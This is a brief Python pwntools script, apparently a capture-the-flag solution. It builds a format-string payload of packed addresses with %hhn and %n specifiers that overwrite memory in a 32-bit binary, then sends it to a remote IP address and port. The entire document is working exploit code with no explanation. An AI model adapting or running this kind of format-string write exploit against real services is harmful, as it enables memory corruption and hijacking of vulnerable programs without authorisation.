from pwn import *

payload = p32(0x804a03c+2)+p32(0x804a03c+3)+p32(0x804a038)+'%161x'+'%7$hhn'+'%49x'+'%8$hhn'+'%36x'+'%9$n'

p = remote('159.65.13.76', 33109)

print p.recv()
p.sendline(payload)
print p.recv()
print p.recv()
